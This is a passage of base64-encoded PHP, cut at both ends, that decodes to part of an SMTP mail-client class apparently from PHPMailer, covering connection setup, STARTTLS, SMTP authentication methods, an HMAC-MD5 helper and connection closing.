XkgICRvcHRpb25zIEFuIGFycmF5IG9mIG9wdGlvbnMgZm9yIHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgpCiAgICAgKgogICAgICogQHJldHVybiBmYWxzZXxyZXNvdXJjZQogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0U01UUENvbm5lY3Rpb24oJGhvc3QsICRwb3J0ID0gbnVsbCwgJHRpbWVvdXQgPSAzMCwgJG9wdGlvbnMgPSBbXSkKICAgIHsKICAgICAgICBzdGF0aWMgJHN0cmVhbW9rOwogICAgICAgIC8vVGhpcyBpcyBlbmFibGVkIGJ5IGRlZmF1bHQgc2luY2UgNS4wLjAgYnV0IHNvbWUgcHJvdmlkZXJzIGRpc2FibGUgaXQKICAgICAgICAvL0NoZWNrIHRoaXMgb25jZSBhbmQgY2FjaGUgdGhlIHJlc3VsdAogICAgICAgIGlmIChudWxsID09PSAkc3RyZWFtb2spIHsKICAgICAgICAgICAgJHN0cmVhbW9rID0gZnVuY3Rpb25fZXhpc3RzKCdzdHJlYW1fc29ja2V0X2NsaWVudCcpOwogICAgICAgIH0KCiAgICAgICAgJGVycm5vID0gMDsKICAgICAgICAkZXJyc3RyID0gJyc7CiAgICAgICAgaWYgKCRzdHJlYW1vaykgewogICAgICAgICAgICAkc29ja2V0X2NvbnRleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdGlvbnMpOwogICAgICAgICAgICBzZXRfZXJyb3JfaGFuZGxlcihmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICBjYWxsX3VzZXJfZnVuY19hcnJheShbJHRoaXMsICdlcnJvckhhbmRsZXInXSwgZnVuY19nZXRfYXJncygpKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICRjb25uZWN0aW9uID0gc3RyZWFtX3NvY2tldF9jbGllbnQoCiAgICAgICAgICAgICAgICAkaG9zdCAuICc6JyAuICRwb3J0LAogICAgICAgICAgICAgICAgJGVycm5vLAogICAgICAgICAgICAgICAgJGVycnN0ciwKICAgICAgICAgICAgICAgICR0aW1lb3V0LAogICAgICAgICAgICAgICAgU1RSRUFNX0NMSUVOVF9DT05ORUNULAogICAgICAgICAgICAgICAgJHNvY2tldF9jb250ZXh0CiAgICAgICAgICAgICk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgLy9GYWxsIGJhY2sgdG8gZnNvY2tvcGVuIHdoaWNoIHNob3VsZCB3b3JrIGluIG1vcmUgcGxhY2VzLCBidXQgaXMgbWlzc2luZyBzb21lIGZlYXR1cmVzCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoCiAgICAgICAgICAgICAgICAnQ29ubmVjdGlvbjogc3RyZWFtX3NvY2tldF9jbGllbnQgbm90IGF2YWlsYWJsZSwgZmFsbGluZyBiYWNrIHRvIGZzb2Nrb3BlbicsCiAgICAgICAgICAgICAgICBzZWxmOjpERUJVR19DT05ORUNUSU9OCiAgICAgICAgICAgICk7CiAgICAgICAgICAgIHNldF9lcnJvcl9oYW5kbGVyKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jX2FycmF5KFskdGhpcywgJ2Vycm9ySGFuZGxlciddLCBmdW5jX2dldF9hcmdzKCkpOwogICAgICAgICAgICB9KTsKICAgICAgICAgICAgJGNvbm5lY3Rpb24gPSBmc29ja29wZW4oCiAgICAgICAgICAgICAgICAkaG9zdCwKICAgICAgICAgICAgICAgICRwb3J0LAogICAgICAgICAgICAgICAgJGVycm5vLAogICAgICAgICAgICAgICAgJGVycnN0ciwKICAgICAgICAgICAgICAgICR0aW1lb3V0CiAgICAgICAgICAgICk7CiAgICAgICAgfQogICAgICAgIHJlc3RvcmVfZXJyb3JfaGFuZGxlcigpOwoKICAgICAgICAvL1ZlcmlmeSB3ZSBjb25uZWN0ZWQgcHJvcGVybHkKICAgICAgICBpZiAoIWlzX3Jlc291cmNlKCRjb25uZWN0aW9uKSkgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoCiAgICAgICAgICAgICAgICAnRmFpbGVkIHRvIGNvbm5lY3QgdG8gc2VydmVyJywKICAgICAgICAgICAgICAgICcnLAogICAgICAgICAgICAgICAgKHN0cmluZykgJGVycm5vLAogICAgICAgICAgICAgICAgJGVycnN0cgogICAgICAgICAgICApOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKAogICAgICAgICAgICAgICAgJ1NNVFAgRVJST1I6ICcgLiAkdGhpcy0+ZXJyb3JbJ2Vycm9yJ10KICAgICAgICAgICAgICAgIC4gIjogJGVycnN0ciAoJGVycm5vKSIsCiAgICAgICAgICAgICAgICBzZWxmOjpERUJVR19DTElFTlQKICAgICAgICAgICAgKTsKCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CgogICAgICAgIC8vU01UUCBzZXJ2ZXIgY2FuIHRha2UgbG9uZ2VyIHRvIHJlc3BvbmQsIGdpdmUgbG9uZ2VyIHRpbWVvdXQgZm9yIGZpcnN0IHJlYWQKICAgICAgICAvL1dpbmRvd3MgZG9lcyBub3QgaGF2ZSBzdXBwb3J0IGZvciB0aGlzIHRpbWVvdXQgZnVuY3Rpb24KICAgICAgICBpZiAoc3RycG9zKFBIUF9PUywgJ1dJTicpICE9PSAwKSB7CiAgICAgICAgICAgICRtYXggPSAoaW50KWluaV9nZXQoJ21heF9leGVjdXRpb25fdGltZScpOwogICAgICAgICAgICAvL0Rvbid0IGJvdGhlciBpZiB1bmxpbWl0ZWQsIG9yIGlmIHNldF90aW1lX2xpbWl0IGlzIGRpc2FibGVkCiAgICAgICAgICAgIGlmICgwICE9PSAkbWF4ICYmICR0aW1lb3V0ID4gJG1heCAmJiBzdHJwb3MoaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKSwgJ3NldF90aW1lX2xpbWl0JykgPT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICBAc2V0X3RpbWVfbGltaXQoJHRpbWVvdXQpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHN0cmVhbV9zZXRfdGltZW91dCgkY29ubmVjdGlvbiwgJHRpbWVvdXQsIDApOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRjb25uZWN0aW9uOwogICAgfQoKICAgIC8qKgogICAgICogSW5pdGlhdGUgYSBUTFMgKGVuY3J5cHRlZCkgc2Vzc2lvbi4KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHN0YXJ0VExTKCkKICAgIHsKICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnU1RBUlRUTFMnLCAnU1RBUlRUTFMnLCAyMjApKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CgogICAgICAgIC8vQWxsb3cgdGhlIGJlc3QgVExTIHZlcnNpb24ocykgd2UgY2FuCiAgICAgICAgJGNyeXB0b19tZXRob2QgPSBTVFJFQU1fQ1JZUFRPX01FVEhPRF9UTFNfQ0xJRU5UOwoKICAgICAgICAvL1BIUCA1LjYuNyBkcm9wcGVkIGluY2x1c2lvbiBvZiBUTFMgMS4xIGFuZCAxLjIgaW4gU1RSRUFNX0NSWVBUT19NRVRIT0RfVExTX0NMSUVOVAogICAgICAgIC8vc28gYWRkIHRoZW0gYmFjayBpbiBtYW51YWxseSBpZiB3ZSBjYW4KICAgICAgICBpZiAoZGVmaW5lZCgnU1RSRUFNX0NSWVBUT19NRVRIT0RfVExTdjFfMl9DTElFTlQnKSkgewogICAgICAgICAgICAkY3J5cHRvX21ldGhvZCB8PSBTVFJFQU1fQ1JZUFRPX01FVEhPRF9UTFN2MV8yX0NMSUVOVDsKICAgICAgICAgICAgJGNyeXB0b19tZXRob2QgfD0gU1RSRUFNX0NSWVBUT19NRVRIT0RfVExTdjFfMV9DTElFTlQ7CiAgICAgICAgfQoKICAgICAgICAvL0JlZ2luIGVuY3J5cHRlZCBjb25uZWN0aW9uCiAgICAgICAgICAgIHNldF9lcnJvcl9oYW5kbGVyKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jX2FycmF5KFskdGhpcywgJ2Vycm9ySGFuZGxlciddLCBmdW5jX2dldF9hcmdzKCkpOwogICAgICAgICAgICB9KTsKICAgICAgICAkY3J5cHRvX29rID0gc3RyZWFtX3NvY2tldF9lbmFibGVfY3J5cHRvKAogICAgICAgICAgICAkdGhpcy0+c210cF9jb25uLAogICAgICAgICAgICB0cnVlLAogICAgICAgICAgICAkY3J5cHRvX21ldGhvZAogICAgICAgICk7CiAgICAgICAgcmVzdG9yZV9lcnJvcl9oYW5kbGVyKCk7CgogICAgICAgIHJldHVybiAoYm9vbCkgJGNyeXB0b19vazsKICAgIH0KCiAgICAvKioKICAgICAqIFBlcmZvcm0gU01UUCBhdXRoZW50aWNhdGlvbi4KICAgICAqIE11c3QgYmUgcnVuIGFmdGVyIGhlbGxvKCkuCiAgICAgKgogICAgICogQHNlZSAgICBoZWxsbygpCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkdXNlcm5hbWUgVGhlIHVzZXIgbmFtZQogICAgICogQHBhcmFtIHN0cmluZyAkcGFzc3dvcmQgVGhlIHBhc3N3b3JkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhdXRodHlwZSBUaGUgYXV0aCB0eXBlIChDUkFNLU1ENSwgUExBSU4sIExPR0lOLCBYT0FVVEgyKQogICAgICogQHBhcmFtIE9BdXRoVG9rZW5Qcm92aWRlciAkT0F1dGggQW4gb3B0aW9uYWwgT0F1dGhUb2tlblByb3ZpZGVyIGluc3RhbmNlIGZvciBYT0FVVEgyIGF1dGhlbnRpY2F0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sIFRydWUgaWYgc3VjY2Vzc2Z1bGx5IGF1dGhlbnRpY2F0ZWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGF1dGhlbnRpY2F0ZSgKICAgICAgICAkdXNlcm5hbWUsCiAgICAgICAgJHBhc3N3b3JkLAogICAgICAgICRhdXRodHlwZSA9IG51bGwsCiAgICAgICAgJE9BdXRoID0gbnVsbAogICAgKSB7CiAgICAgICAgaWYgKCEkdGhpcy0+c2VydmVyX2NhcHMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCdBdXRoZW50aWNhdGlvbiBpcyBub3QgYWxsb3dlZCBiZWZvcmUgSEVMTy9FSExPJyk7CgogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygnRUhMTycsICR0aGlzLT5zZXJ2ZXJfY2FwcykpIHsKICAgICAgICAgICAgLy9TTVRQIGV4dGVuc2lvbnMgYXJlIGF2YWlsYWJsZTsgdHJ5IHRvIGZpbmQgYSBwcm9wZXIgYXV0aGVudGljYXRpb24gbWV0aG9kCiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygnQVVUSCcsICR0aGlzLT5zZXJ2ZXJfY2FwcykpIHsKICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcignQXV0aGVudGljYXRpb24gaXMgbm90IGFsbG93ZWQgYXQgdGhpcyBzdGFnZScpOwogICAgICAgICAgICAgICAgLy8nYXQgdGhpcyBzdGFnZScgbWVhbnMgdGhhdCBhdXRoIG1heSBiZSBhbGxvd2VkIGFmdGVyIHRoZSBzdGFnZSBjaGFuZ2VzCiAgICAgICAgICAgICAgICAvL2UuZy4gYWZ0ZXIgU1RBUlRUTFMKCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ0F1dGggbWV0aG9kIHJlcXVlc3RlZDogJyAuICgkYXV0aHR5cGUgPzogJ1VOU1BFQ0lGSUVEJyksIHNlbGY6OkRFQlVHX0xPV0xFVkVMKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygKICAgICAgICAgICAgICAgICdBdXRoIG1ldGhvZHMgYXZhaWxhYmxlIG9uIHRoZSBzZXJ2ZXI6ICcgLiBpbXBsb2RlKCcsJywgJHRoaXMtPnNlcnZlcl9jYXBzWydBVVRIJ10pLAogICAgICAgICAgICAgICAgc2VsZjo6REVCVUdfTE9XTEVWRUwKICAgICAgICAgICAgKTsKCiAgICAgICAgICAgIC8vSWYgd2UgaGF2ZSByZXF1ZXN0ZWQgYSBzcGVjaWZpYyBhdXRoIHR5cGUsIGNoZWNrIHRoZSBzZXJ2ZXIgc3VwcG9ydHMgaXQgYmVmb3JlIHRyeWluZyBvdGhlcnMKICAgICAgICAgICAgaWYgKG51bGwgIT09ICRhdXRodHlwZSAmJiAhaW5fYXJyYXkoJGF1dGh0eXBlLCAkdGhpcy0+c2VydmVyX2NhcHNbJ0FVVEgnXSwgdHJ1ZSkpIHsKICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ1JlcXVlc3RlZCBhdXRoIG1ldGhvZCBub3QgYXZhaWxhYmxlOiAnIC4gJGF1dGh0eXBlLCBzZWxmOjpERUJVR19MT1dMRVZFTCk7CiAgICAgICAgICAgICAgICAkYXV0aHR5cGUgPSBudWxsOwogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoZW1wdHkoJGF1dGh0eXBlKSkgewogICAgICAgICAgICAgICAgLy9JZiBubyBhdXRoIG1lY2hhbmlzbSBpcyBzcGVjaWZpZWQsIGF0dGVtcHQgdG8gdXNlIHRoZXNlLCBpbiB0aGlzIG9yZGVyCiAgICAgICAgICAgICAgICAvL1RyeSBDUkFNLU1ENSBmaXJzdCBhcyBpdCdzIG1vcmUgc2VjdXJlIHRoYW4gdGhlIG90aGVycwogICAgICAgICAgICAgICAgZm9yZWFjaCAoWydDUkFNLU1ENScsICdMT0dJTicsICdQTEFJTicsICdYT0FVVEgyJ10gYXMgJG1ldGhvZCkgewogICAgICAgICAgICAgICAgICAgIGlmIChpbl9hcnJheSgkbWV0aG9kLCAkdGhpcy0+c2VydmVyX2NhcHNbJ0FVVEgnXSwgdHJ1ZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGh0eXBlID0gJG1ldGhvZDsKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKGVtcHR5KCRhdXRodHlwZSkpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ05vIHN1cHBvcnRlZCBhdXRoZW50aWNhdGlvbiBtZXRob2RzIGZvdW5kJyk7CgogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ0F1dGggbWV0aG9kIHNlbGVjdGVkOiAnIC4gJGF1dGh0eXBlLCBzZWxmOjpERUJVR19MT1dMRVZFTCk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICghaW5fYXJyYXkoJGF1dGh0eXBlLCAkdGhpcy0+c2VydmVyX2NhcHNbJ0FVVEgnXSwgdHJ1ZSkpIHsKICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigiVGhlIHJlcXVlc3RlZCBhdXRoZW50aWNhdGlvbiBtZXRob2QgXCIkYXV0aHR5cGVcIiBpcyBub3Qgc3VwcG9ydGVkIGJ5IHRoZSBzZXJ2ZXIiKTsKCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2VpZiAoZW1wdHkoJGF1dGh0eXBlKSkgewogICAgICAgICAgICAkYXV0aHR5cGUgPSAnTE9HSU4nOwogICAgICAgIH0KICAgICAgICBzd2l0Y2ggKCRhdXRodHlwZSkgewogICAgICAgICAgICBjYXNlICdQTEFJTic6CiAgICAgICAgICAgICAgICAvL1N0YXJ0IGF1dGhlbnRpY2F0aW9uCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnQVVUSCcsICdBVVRIIFBMQUlOJywgMzM0KSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vU2VuZCBlbmNvZGVkIHVzZXJuYW1lIGFuZCBwYXNzd29yZAogICAgICAgICAgICAgICAgaWYgKAogICAgICAgICAgICAgICAgICAgIC8vRm9ybWF0IGZyb20gaHR0cHM6Ly93d3cucmZjLWVkaXRvci5vcmcvcmZjL3JmYzQ2MTYjc2VjdGlvbi0yCiAgICAgICAgICAgICAgICAgICAgLy9XZSBza2lwIHRoZSBmaXJzdCBmaWVsZCAoaXQncyBmb3JnZXJ5KSwgc28gdGhlIHN0cmluZyBzdGFydHMgd2l0aCBhIG51bGwgYnl0ZQogICAgICAgICAgICAgICAgICAgICEkdGhpcy0+c2VuZENvbW1hbmQoCiAgICAgICAgICAgICAgICAgICAgICAgICdVc2VyICYgUGFzc3dvcmQnLAogICAgICAgICAgICAgICAgICAgICAgICBiYXNlNjRfZW5jb2RlKCJcMCIgLiAkdXNlcm5hbWUgLiAiXDAiIC4gJHBhc3N3b3JkKSwKICAgICAgICAgICAgICAgICAgICAgICAgMjM1CiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ0xPR0lOJzoKICAgICAgICAgICAgICAgIC8vU3RhcnQgYXV0aGVudGljYXRpb24KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdBVVRIJywgJ0FVVEggTE9HSU4nLCAzMzQpKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ1VzZXJuYW1lJywgYmFzZTY0X2VuY29kZSgkdXNlcm5hbWUpLCAzMzQpKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ1Bhc3N3b3JkJywgYmFzZTY0X2VuY29kZSgkcGFzc3dvcmQpLCAyMzUpKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ0NSQU0tTUQ1JzoKICAgICAgICAgICAgICAgIC8vU3RhcnQgYXV0aGVudGljYXRpb24KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdBVVRIIENSQU0tTUQ1JywgJ0FVVEggQ1JBTS1NRDUnLCAzMzQpKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy9HZXQgdGhlIGNoYWxsZW5nZQogICAgICAgICAgICAgICAgJGNoYWxsZW5nZSA9IGJhc2U2NF9kZWNvZGUoc3Vic3RyKCR0aGlzLT5sYXN0X3JlcGx5LCA0KSk7CgogICAgICAgICAgICAgICAgLy9CdWlsZCB0aGUgcmVzcG9uc2UKICAgICAgICAgICAgICAgICRyZXNwb25zZSA9ICR1c2VybmFtZSAuICcgJyAuICR0aGlzLT5obWFjKCRjaGFsbGVuZ2UsICRwYXNzd29yZCk7CgogICAgICAgICAgICAgICAgLy9zZW5kIGVuY29kZWQgY3JlZGVudGlhbHMKICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ1VzZXJuYW1lJywgYmFzZTY0X2VuY29kZSgkcmVzcG9uc2UpLCAyMzUpOwogICAgICAgICAgICBjYXNlICdYT0FVVEgyJzoKICAgICAgICAgICAgICAgIC8vVGhlIE9BdXRoIGluc3RhbmNlIG11c3QgYmUgc2V0IHVwIHByaW9yIHRvIHJlcXVlc3RpbmcgYXV0aC4KICAgICAgICAgICAgICAgIGlmIChudWxsID09PSAkT0F1dGgpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkb2F1dGggPSAkT0F1dGgtPmdldE9hdXRoNjQoKTsKCiAgICAgICAgICAgICAgICAvL1N0YXJ0IGF1dGhlbnRpY2F0aW9uCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnQVVUSCcsICdBVVRIIFhPQVVUSDIgJyAuICRvYXV0aCwgMjM1KSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCJBdXRoZW50aWNhdGlvbiBtZXRob2QgXCIkYXV0aHR5cGVcIiBpcyBub3Qgc3VwcG9ydGVkIik7CgogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBDYWxjdWxhdGUgYW4gTUQ1IEhNQUMgaGFzaC4KICAgICAqIFdvcmtzIGxpa2UgaGFzaF9obWFjKCdtZDUnLCAkZGF0YSwgJGtleSkKICAgICAqIGluIGNhc2UgdGhhdCBmdW5jdGlvbiBpcyBub3QgYXZhaWxhYmxlLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGRhdGEgVGhlIGRhdGEgdG8gaGFzaAogICAgICogQHBhcmFtIHN0cmluZyAka2V5ICBUaGUga2V5IHRvIGhhc2ggd2l0aAogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBobWFjKCRkYXRhLCAka2V5KQogICAgewogICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ2hhc2hfaG1hYycpKSB7CiAgICAgICAgICAgIHJldHVybiBoYXNoX2htYWMoJ21kNScsICRkYXRhLCAka2V5KTsKICAgICAgICB9CgogICAgICAgIC8vVGhlIGZvbGxvd2luZyBib3Jyb3dlZCBmcm9tCiAgICAgICAgLy9odHRwczovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5taGFzaC5waHAjMjcyMjUKCiAgICAgICAgLy9SRkMgMjEwNCBITUFDIGltcGxlbWVudGF0aW9uIGZvciBwaHAuCiAgICAgICAgLy9DcmVhdGVzIGFuIG1kNSBITUFDLgogICAgICAgIC8vRWxpbWluYXRlcyB0aGUgbmVlZCB0byBpbnN0YWxsIG1oYXNoIHRvIGNvbXB1dGUgYSBITUFDCiAgICAgICAgLy9ieSBMYW5jZSBSdXNoaW5nCgogICAgICAgICRieXRlbGVuID0gNjQ7IC8vYnl0ZSBsZW5ndGggZm9yIG1kNQogICAgICAgIGlmIChzdHJsZW4oJGtleSkgPiAkYnl0ZWxlbikgewogICAgICAgICAgICAka2V5ID0gcGFjaygnSConLCBtZDUoJGtleSkpOwogICAgICAgIH0KICAgICAgICAka2V5ID0gc3RyX3BhZCgka2V5LCAkYnl0ZWxlbiwgY2hyKDB4MDApKTsKICAgICAgICAkaXBhZCA9IHN0cl9wYWQoJycsICRieXRlbGVuLCBjaHIoMHgzNikpOwogICAgICAgICRvcGFkID0gc3RyX3BhZCgnJywgJGJ5dGVsZW4sIGNocigweDVjKSk7CiAgICAgICAgJGtfaXBhZCA9ICRrZXkgXiAkaXBhZDsKICAgICAgICAka19vcGFkID0gJGtleSBeICRvcGFkOwoKICAgICAgICByZXR1cm4gbWQ1KCRrX29wYWQgLiBwYWNrKCdIKicsIG1kNSgka19pcGFkIC4gJGRhdGEpKSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayBjb25uZWN0aW9uIHN0YXRlLgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCBUcnVlIGlmIGNvbm5lY3RlZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY29ubmVjdGVkKCkKICAgIHsKICAgICAgICBpZiAoaXNfcmVzb3VyY2UoJHRoaXMtPnNtdHBfY29ubikpIHsKICAgICAgICAgICAgJHNvY2tfc3RhdHVzID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJHRoaXMtPnNtdHBfY29ubik7CiAgICAgICAgICAgIGlmICgkc29ja19zdGF0dXNbJ2VvZiddKSB7CiAgICAgICAgICAgICAgICAvL1RoZSBzb2NrZXQgaXMgdmFsaWQgYnV0IHdlIGFyZSBub3QgY29ubmVjdGVkCiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKAogICAgICAgICAgICAgICAgICAgICdTTVRQIE5PVElDRTogRU9GIGNhdWdodCB3aGlsZSBjaGVja2luZyBpZiBjb25uZWN0ZWQnLAogICAgICAgICAgICAgICAgICAgIHNlbGY6OkRFQlVHX0NMSUVOVAogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICR0aGlzLT5jbG9zZSgpOwoKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuIHRydWU7IC8vZXZlcnl0aGluZyBsb29rcyBnb29kCiAgICAgICAgfQoKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbG9zZSB0aGUgc29ja2V0IGFuZCBjbGVhbiB1cCB0aGUgc3RhdGUgb2YgdGhlIGNsYXNzLgogICAgICogRG9uJ3QgdXNlIHRoaXMgZnVuY3Rpb24gd2l0aG91dCBmaXJzdCB0cnlpbmcgdG8gdXNlIFFVSVQuCiAgICAgKgogICAgICogQHNlZSBxdWl0KCkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsb3NlKCkKICAgIHsKICAgICAgICAkdGhpcy0+c2VydmVyX2NhcHMgPSBudWxsOwogICAgICAgICR0aGlzLT5oZWxvX3JwbHkgPSBudWxsOwogICAgICAgIGlmIChpc19yZXNvdXJjZSgkdGhpcy0+c210cF9jb25uKSkgewogICAgICAgICAgICAvL0Nsb3NlIHRoZSBjb25uZWN0aW9uIGFuZCBjbGVhbnVwCiAgICAgICAgICAgIGZjbG9zZSgkdGhpcy0+c210cF9jb25uKTsKICAgICAgICAgICAgJHRoaXMtPnNtdHBfY29ubiA9IG51bGw7IC8vTWFrZXMgZm9yIGNsZWFuZXIgc2VyaWFsaXphdGlvbgogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCdDb25uZWN0aW9uOiBjbG9zZWQnLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIGFuIFNNVFAgREFUQSBjb21tYW5kLgogICAgICogSXNzdWVzIGEgZGF0YSBjb21tYW5kIGFuZCBzZW5kcyB0aGUgbXNnX2RhdGEgdG8gdGhlIHNlcnZlciwKICAgICAqIGZpbmFsaXppbmcgdGhlIG1haWwgdHJhbnNhY3Rpb24uICRtc2dfZGF0YSBpcyB0aGUgbWVzc2FnZQogICAgICogdGhhdCBpcyB0byBiZSBzZW50IHdpdGggdGhlIGhlYWRlcnMuIEVhY2ggaGVhZGVyIG5lZWRzIHRvIGJlCiAgICAgKiBvbiBhIHNpbmdsZSBsaW5lIGZvbGxvd2VkIGJ5IGEgPENSTEY+IHdpdGggdGhlIG1lc3NhZ2UgaGVhZGVycwogICAgICogYW5kIHRoZSBtZXNzYWdlIGJvZHkgYmVpbmcgc2VwYXJhdGVkIGJ5IGFuIGFkZGl0aW9uYWwgPENSTEY+LgogICAgICogSW1wbGVtZW50cyBSRkMgODIxOiBEQVRBIDxDUkxGPi4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRtc2dfZGF0YSBNZXNzYWdlIGRhdGEgdG8gc2VuZAogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZGF0YSgkbXNnX2RhdGEpCiAgICB7CiAgICAgICAgLy9UaGlzIHdpbGwgdXNlIHRoZSBzdGFuZGFyZCB0aW1lbGltaXQKICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnREFUQScsICdEQVRBJywgMzU0KSkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICAvKiBUaGUgc2VydmVyIGlzIHJlYWR5IHRvIGFjY2VwdCBkYXRhIQogICAgICAgICAqIEFjY29yZGluZyB0byByZmM4MjEgd2Ugc2hvdWxkIG5vdCBzZW5kIG1vcmUgdGhhbiAxMDAwIGNoYXJhY3RlcnMgb24gYSBzaW5nbGUgbGluZSAoaW5jbHVkaW5nIHRoZSBMRSkKICAgICAgICAgKiBzbyB3ZSB3aWxsIGJyZWFrIHRoZSBkYXRhIHVwIGludG8gbGluZXMgYnkgXHIgYW5kL29yIFxuIHRoZW4gaWYgbmVlZGVkIHdlIHdpbGwgYnJlYWsgZWFjaCBvZiB0aG9zZSBpbnRvCiAgICAgICAgICogc21hbGxlciBsaW5lcyB0byBmaXQgd2l0aGluIHRoZSBsaW1pdC4KIC